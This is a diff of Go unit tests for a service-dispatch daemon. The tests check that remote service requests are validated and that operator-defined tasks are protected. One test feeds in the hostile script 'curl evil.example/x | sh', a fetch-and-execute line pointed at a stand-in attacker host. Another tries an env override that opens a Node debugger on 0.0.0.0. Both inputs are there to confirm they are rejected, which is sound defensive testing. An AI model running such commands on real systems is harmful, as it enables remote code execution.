@@ -27,24 +27,17 @@ func shellAvailable() executor.Availability {
 func TestHandleServiceApply_UpsertsServiceTask(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
-	backoff := protocol.RestartBackoffExponential
+	backoff := protocol.BackoffExponential
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Type: "service:apply",
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:            "svc-1",
-			TaskName:          "My Service",
-			Script:            shellScript(t, "sleep 1"),
-			Instances:         3,
-			Autostart:         true,
-			RestartDelay:      2000,
-			RestartBackoff:    backoff,
-			BackoffResetAfter: 60000,
-			TaskConfig: &protocol.ExecutionTaskConfig{
-				Env:          map[string]string{"FOO": "bar"},
-				GracefulStop: 5000,
-			},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc-1",
+		TaskName: "My Service",
+		Spec:     shellScript(t, "sleep 1"),
+		Options: &protocol.RunOptions{
+			Env:            map[string]string{"FOO": "bar"},
+			GracefulStopMs: 5000,
 		},
+		Settings: &protocol.ServiceSettings{Instances: 3, Autostart: true, RestartDelayMs: 2000, RestartBackoff: backoff, BackoffResetAfterMs: 60000},
 	})
 	require.NoError(t, err)
 
@@ -70,13 +63,10 @@ func TestHandleServiceApply_AutostartStartsInstancesOnRealManager(t *testing.T) 
 	h := newDispatchHandler(shellAvailable(), nil)
 	h.taskManager = manager
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "svc-auto",
-			Script:    shellScript(t, "sleep 1"),
-			Instances: 2,
-			Autostart: true,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc-auto",
+		Spec:     shellScript(t, "sleep 1"),
+		Settings: &protocol.ServiceSettings{Instances: 2, Autostart: true},
 	})
 	require.NoError(t, err)
 
@@ -92,14 +82,11 @@ func TestHandleServiceApply_NoAutostartDoesNotStart(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "svc-2",
-			TaskName:  "svc-2",
-			Script:    shellScript(t, "sleep 1"),
-			Instances: 1,
-			Autostart: false,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc-2",
+		TaskName: "svc-2",
+		Spec:     shellScript(t, "sleep 1"),
+		Settings: &protocol.ServiceSettings{Instances: 1, Autostart: false},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -108,13 +95,16 @@ func TestHandleServiceApply_NoAutostartDoesNotStart(t *testing.T) {
 
 func TestHandleServiceApply_UnavailableBackendRejected(t *testing.T) {
 	h := newDispatchHandler(executor.Availability{}, nil)
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "svc", TaskName: "svc", Script: shellScript(t, "x"), Instances: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc",
+		TaskName: "svc",
+		Spec:     shellScript(t, "x"),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeUnavailable, ce.Code)
 }
 
 // TestHandleServiceApply_HTTPRejectedWithoutDispatch confirms an HTTP-type
@@ -123,16 +113,19 @@ func TestHandleServiceApply_UnavailableBackendRejected(t *testing.T) {
 // persistent auto-restarting service, so it is not exempt from the opt-in.
 func TestHandleServiceApply_HTTPRejectedWithoutDispatch(t *testing.T) {
 	avail := executor.Availability{
-		HTTP: executor.BackendStatus{Available: false, Reason: "station dispatch disabled (set [daemon] allow_station_dispatch = true to enable)"},
+		HTTP: executor.BackendStatus{Available: false, Reason: "station dispatch disabled (set [daemon] allow_station_dispatch = true to enable)", Policy: true},
 	}
 	h := newDispatchHandler(avail, nil)
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "svc-http", TaskName: "svc-http", Script: httpScript(t, "https://example.com"), Instances: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc-http",
+		TaskName: "svc-http",
+		Spec:     httpScript(t, "https://example.com"),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeForbidden, ce.Code)
 }
 
 // TestHandleServiceApply_HTTPAllowedWithDispatch confirms HTTP-type service
@@ -141,8 +134,11 @@ func TestHandleServiceApply_HTTPAllowedWithDispatch(t *testing.T) {
 	h := newDispatchHandler(executor.Availability{HTTP: executor.BackendStatus{Available: true}}, nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "svc-http", TaskName: "svc-http", Script: httpScript(t, "https://example.com"), Instances: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc-http",
+		TaskName: "svc-http",
+		Spec:     httpScript(t, "https://example.com"),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -151,28 +147,28 @@ func TestHandleServiceApply_HTTPAllowedWithDispatch(t *testing.T) {
 
 func TestHandleServiceApply_MissingServiceRejected(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{})
+	err := h.HandleServiceApply(protocol.ServiceApply{})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 func TestHandleServiceControl_RoutesActions(t *testing.T) {
 	cases := []struct {
-		action protocol.Action
+		action protocol.ServiceAction
 		assert func(t *testing.T, r *fakeTaskRunner, name string)
 	}{
-		{protocol.ActionStart, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.startedServices) }},
-		{protocol.ActionStop, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.stoppedServices) }},
-		{protocol.ActionRestart, func(t *testing.T, r *fakeTaskRunner, name string) {
+		{protocol.ServiceActionStart, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.startedServices) }},
+		{protocol.ServiceActionStop, func(t *testing.T, r *fakeTaskRunner, name string) { assert.Equal(t, []string{name}, r.stoppedServices) }},
+		{protocol.ServiceActionRestart, func(t *testing.T, r *fakeTaskRunner, name string) {
 			assert.Equal(t, []string{name}, r.restartedServices)
 		}},
 	}
 	for _, tc := range cases {
 		h := newDispatchHandler(shellAvailable(), nil)
 		runner := h.taskManager.(*fakeTaskRunner)
-		err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: tc.action})
+		err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "svc-1", Action: tc.action})
 		require.NoError(t, err)
 		tc.assert(t, runner, sanitizeStationTaskName("svc-1"))
 	}
@@ -180,33 +176,33 @@ func TestHandleServiceControl_RoutesActions(t *testing.T) {
 
 func TestHandleServiceControl_MissingActionRejected(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
-	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1"})
+	err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "svc-1"})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 func TestHandleServiceControl_MissingTaskIDRejected(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
-	err := h.HandleServiceControl(protocol.ServiceControlMessage{Action: protocol.ActionStart})
+	err := h.HandleServiceControl(protocol.ServiceControl{Action: protocol.ServiceActionStart})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 func TestHandleServiceControl_UnknownActionRejected(t *testing.T) {
 	// An action this daemon doesn't know decodes as-is and is rejected, never
 	// mapped onto a known action.
-	var msg protocol.ServiceControlMessage
+	var msg protocol.ServiceControl
 	require.NoError(t, json.Unmarshal([]byte(`{"type":"service:control","taskId":"svc-1","action":"pause"}`), &msg))
 	h := newDispatchHandler(shellAvailable(), nil)
 	err := h.HandleServiceControl(msg)
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 func TestHandleServiceControl_RunnerErrorIsConflict(t *testing.T) {
@@ -214,11 +210,11 @@ func TestHandleServiceControl_RunnerErrorIsConflict(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 	runner.serviceErr = errors.New("already running")
 
-	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "svc-1", Action: protocol.ActionStart})
+	err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "svc-1", Action: protocol.ServiceActionStart})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 }
 
 func TestHandleServiceApply_AutostartStartErrorIsConflict(t *testing.T) {
@@ -226,41 +222,45 @@ func TestHandleServiceApply_AutostartStartErrorIsConflict(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 	runner.serviceErr = errors.New("port in use")
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "svc", TaskName: "svc", Script: shellScript(t, "x"), Instances: 1, Autostart: true},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc",
+		TaskName: "svc",
+		Spec:     shellScript(t, "x"),
+		Settings: &protocol.ServiceSettings{Instances: 1, Autostart: true},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 }
 
 func TestHandleServiceApply_InvalidScriptRejected(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "svc", Script: json.RawMessage(`not-json`), Instances: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc",
+		Spec:     json.RawMessage(`not-json`),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 // Covers buildServiceTask's name fallbacks and defaults: an empty taskId falls
 // back to taskName, a sub-one instance count is clamped to 1, and the optional
 // logOnFull knob is overlaid onto the task.
 func TestHandleServiceApply_NameFallbackAndDefaults(t *testing.T) {
-	logOnFull := protocol.LogOnFullKill
+	logOnFull := "kill"
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskName:   "Fallback Svc",
-			Script:     shellScript(t, "sleep 1"),
-			Instances:  0, // clamped to 1
-			TaskConfig: &protocol.ExecutionTaskConfig{LogOnFull: logOnFull},
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskName: "Fallback Svc",
+		Spec:     shellScript(t, "sleep 1"),
+		// clamped to 1
+		Options:  &protocol.RunOptions{LogOnFull: logOnFull},
+		Settings: &protocol.ServiceSettings{Instances: 0},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -274,16 +274,14 @@ func TestHandleServiceApply_RejectsInvalidFailures(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:     "svc",
-			Script:     shellScript(t, "sleep 1"),
-			TaskConfig: &protocol.ExecutionTaskConfig{Failures: []string{"failed", "+timeout"}},
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:  "svc",
+		Spec:    shellScript(t, "sleep 1"),
+		Options: &protocol.RunOptions{Failures: []string{"failed", "+timeout"}},
 	})
 	var se *StationError
 	require.ErrorAs(t, err, &se)
-	assert.Equal(t, StationErrorKindValidation, se.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, se.Code)
 	assert.Empty(t, runner.upserted)
 }
 
@@ -291,8 +289,9 @@ func TestHandleServiceApply_DefaultsToStationServiceName(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{Script: shellScript(t, "sleep 1"), Instances: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		Spec:     shellScript(t, "sleep 1"),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -319,13 +318,10 @@ func TestHandleServiceApply_MergesOntoExistingTOMLService(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "heartbeat",
-			TaskName:  "heartbeat",
-			Instances: 3,
-			Autostart: true, // ignored on the merge path
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "heartbeat",
+		TaskName: "heartbeat", // ignored on the merge path
+		Settings: &protocol.ServiceSettings{Instances: 3, Autostart: true},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -358,13 +354,11 @@ func TestHandleServiceApply_MergeKeepsCommandOnNullScript(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "heartbeat",
-			TaskName:  "heartbeat",
-			Script:    json.RawMessage("null"),
-			Instances: 2,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "heartbeat",
+		TaskName: "heartbeat",
+		Spec:     json.RawMessage("null"),
+		Settings: &protocol.ServiceSettings{Instances: 2},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -389,11 +383,9 @@ func TestHandleServiceApply_MergeAppliesOverriddenScript(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID: "heartbeat",
-			Script: shellScript(t, "new.sh"),
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID: "heartbeat",
+		Spec:   shellScript(t, "new.sh"),
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -408,7 +400,7 @@ func TestHandleServiceApply_MergeAppliesOverriddenScript(t *testing.T) {
 // HealthyAfter, restartBackoff) onto the live definition; absent/zero fields are
 // left as they were.
 func TestHandleServiceApply_MergeOverlaysRestartFields(t *testing.T) {
-	backoff := protocol.RestartBackoffExponential
+	backoff := protocol.BackoffExponential
 	existing := &model.Task{
 		Name:          "heartbeat",
 		Kind:          model.KindService,
@@ -421,14 +413,10 @@ func TestHandleServiceApply_MergeOverlaysRestartFields(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:            "heartbeat",
-			TaskName:          "heartbeat",
-			RestartDelay:      2000,
-			BackoffResetAfter: 60000,
-			RestartBackoff:    backoff,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "heartbeat",
+		TaskName: "heartbeat",
+		Settings: &protocol.ServiceSettings{RestartDelayMs: 2000, BackoffResetAfterMs: 60000, RestartBackoff: backoff},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -455,13 +443,14 @@ func TestHandleServiceApply_MergeInvalidScriptOverrideRejected(t *testing.T) {
 	}
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "heartbeat", Script: json.RawMessage("not-json")},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID: "heartbeat",
+		Spec:   json.RawMessage("not-json"),
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 }
 
 // A script override whose execution type has no available backend is a conflict
@@ -478,13 +467,14 @@ func TestHandleServiceApply_MergeUnavailableBackendRejected(t *testing.T) {
 	}
 	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"heartbeat": existing})
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "heartbeat", Script: shellScript(t, "new.sh")},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID: "heartbeat",
+		Spec:   shellScript(t, "new.sh"),
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeUnavailable, ce.Code)
 }
 
 // Regression: a peer must not reshape the spawn environment of a TOML-defined
@@ -511,23 +501,21 @@ func TestHandleServiceApply_MergeEnvGatedOnAvailability(t *testing.T) {
 		Env:           map[string]string{"NODE_ENV": "production"},
 		Run:           "node server.js",
 	}
-	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"web": existing})
+	h := newDispatchHandler(executor.Availability{Shell: executor.BackendStatus{Reason: "station dispatch disabled", Policy: true}}, map[string]*model.Task{"web": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:   "web",
-			TaskName: "web",
-			Script:   json.RawMessage("null"),
-			TaskConfig: &protocol.ExecutionTaskConfig{
-				Env: map[string]string{"NODE_OPTIONS": "--inspect=0.0.0.0:9229"},
-			},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "web",
+		TaskName: "web",
+		Spec:     json.RawMessage("null"),
+		Options: &protocol.RunOptions{
+			Env: map[string]string{"NODE_OPTIONS": "--inspect=0.0.0.0:9229"},
 		},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeForbidden, ce.Code)
 	assert.Empty(t, runner.upserted, "a rejected env override must not reach the task set")
 	assert.Equal(t, map[string]string{"NODE_ENV": "production"}, existing.Env,
 		"the operator's env must be left intact")
@@ -548,13 +536,11 @@ func TestHandleServiceApply_MergeEnvAppliedWhenAvailable(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"web": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:     "web",
-			TaskName:   "web",
-			Script:     json.RawMessage("null"),
-			TaskConfig: &protocol.ExecutionTaskConfig{Env: map[string]string{"LOG_LEVEL": "debug"}},
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "web",
+		TaskName: "web",
+		Spec:     json.RawMessage("null"),
+		Options:  &protocol.RunOptions{Env: map[string]string{"LOG_LEVEL": "debug"}},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -577,13 +563,11 @@ func TestHandleServiceApply_MergeWithoutEnvNotGated(t *testing.T) {
 	h := newDispatchHandler(executor.Availability{}, map[string]*model.Task{"web": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "web",
-			TaskName:  "web",
-			Script:    json.RawMessage("null"),
-			Instances: 2,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "web",
+		TaskName: "web",
+		Spec:     json.RawMessage("null"),
+		Settings: &protocol.ServiceSettings{Instances: 2},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -605,18 +589,16 @@ func TestHandleServiceApply_MergeEnvRefusedWithoutExecutionDefinition(t *testing
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"web": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:     "web",
-			TaskName:   "web",
-			Script:     json.RawMessage("null"),
-			TaskConfig: &protocol.ExecutionTaskConfig{Env: map[string]string{"NODE_OPTIONS": "--inspect"}},
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "web",
+		TaskName: "web",
+		Spec:     json.RawMessage("null"),
+		Options:  &protocol.RunOptions{Env: map[string]string{"NODE_OPTIONS": "--inspect"}},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 	assert.Empty(t, runner.upserted)
 }
 
@@ -633,18 +615,16 @@ func TestHandleServiceApply_RejectsNonServiceTaskCollision(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "backup",
-			TaskName:  "backup",
-			Script:    shellScript(t, "curl evil.example/x | sh"),
-			Instances: 1,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "backup",
+		TaskName: "backup",
+		Spec:     shellScript(t, "curl evil.example/x | sh"),
+		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 	assert.Empty(t, runner.upserted, "a colliding non-service name must not upsert")
 	assert.Same(t, origExec, cron.ExecutionDef, "the cron task's run= must be left untouched")
 }
@@ -656,11 +636,11 @@ func TestHandleServiceControl_RejectsNonServiceTaskCollision(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceControl(protocol.ServiceControlMessage{TaskID: "backup", Action: protocol.ActionStart})
+	err := h.HandleServiceControl(protocol.ServiceControl{TaskID: "backup", Action: protocol.ServiceActionStart})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 	assert.Empty(t, runner.startedServices)
 }
 
@@ -671,18 +651,16 @@ func TestHandleServiceApply_RejectsInstanceCountAboveCap(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "svc",
-			TaskName:  "svc",
-			Script:    shellScript(t, "sleep 1"),
-			Instances: config.MaxServiceInstances + 1,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "svc",
+		TaskName: "svc",
+		Spec:     shellScript(t, "sleep 1"),
+		Settings: &protocol.ServiceSettings{Instances: config.MaxServiceInstances + 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 	assert.Empty(t, runner.upserted, "an over-cap apply must not register the task")
 }
 
@@ -700,17 +678,15 @@ func TestHandleServiceApply_MergeRejectsInstanceCountAboveCap(t *testing.T) {
 	}
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{
-			TaskID:    "heartbeat",
-			TaskName:  "heartbeat",
-			Instances: config.MaxServiceInstances + 1,
-		},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "heartbeat",
+		TaskName: "heartbeat",
+		Settings: &protocol.ServiceSettings{Instances: config.MaxServiceInstances + 1},
 	})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeInvalid, ce.Code)
 	assert.Equal(t, 1, existing.Instances, "an over-cap merge must not rescale the live service")
 }
 
@@ -722,7 +698,7 @@ func TestHandleServiceRemove_DropsExistingService(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "heartbeat"})
+	err := h.HandleServiceRemove(protocol.ServiceRemove{TaskID: "heartbeat"})
 	require.NoError(t, err)
 	assert.Equal(t, []string{"heartbeat"}, runner.removed)
 }
@@ -739,11 +715,11 @@ func TestHandleServiceRemove_RejectsTOMLDefinedService(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"heartbeat": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "heartbeat"})
+	err := h.HandleServiceRemove(protocol.ServiceRemove{TaskID: "heartbeat"})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindConflict, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeForbidden, ce.Code)
 	assert.Empty(t, runner.removed, "a TOML-defined service must never be removed by the control plane")
 }
 
@@ -754,11 +730,11 @@ func TestHandleServiceRemove_RejectsNonServiceTask(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"backup": cron})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "backup"})
+	err := h.HandleServiceRemove(protocol.ServiceRemove{TaskID: "backup"})
 	require.Error(t, err)
 	var ce *StationError
 	require.ErrorAs(t, err, &ce)
-	assert.Equal(t, StationErrorKindValidation, ce.Kind)
+	assert.Equal(t, protocol.ErrorCodeConflict, ce.Code)
 	assert.Empty(t, runner.removed, "a non-service task must never be removed")
 }
 
@@ -768,7 +744,7 @@ func TestHandleServiceRemove_UnknownTaskIsNoop(t *testing.T) {
 	h := newDispatchHandler(shellAvailable(), nil)
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceRemove(protocol.ServiceRemoveMessage{TaskID: "01JMISSING0000000000000000"})
+	err := h.HandleServiceRemove(protocol.ServiceRemove{TaskID: "01JMISSING0000000000000000"})
 	require.NoError(t, err)
 	assert.Empty(t, runner.removed)
 }
@@ -789,12 +765,14 @@ func TestHandleServiceApply_MergeRejectedWhenManualTriggerDisabled(t *testing.T)
 	h := newDispatchHandler(shellAvailable(), map[string]*model.Task{"locked": existing})
 	runner := h.taskManager.(*fakeTaskRunner)
 
-	err := h.HandleServiceApply(protocol.ServiceApplyMessage{
-		Service: &protocol.ServiceApplyPayload{TaskID: "locked", TaskName: "locked", Instances: 5, RestartDelay: 1},
+	err := h.HandleServiceApply(protocol.ServiceApply{
+		TaskID:   "locked",
+		TaskName: "locked",
+		Settings: &protocol.ServiceSettings{Instances: 5, RestartDelayMs: 1},
 	})
 	var stErr *StationError
 	require.ErrorAs(t, err, &stErr)
-	assert.Equal(t, StationErrorKindConflict, stErr.Kind)
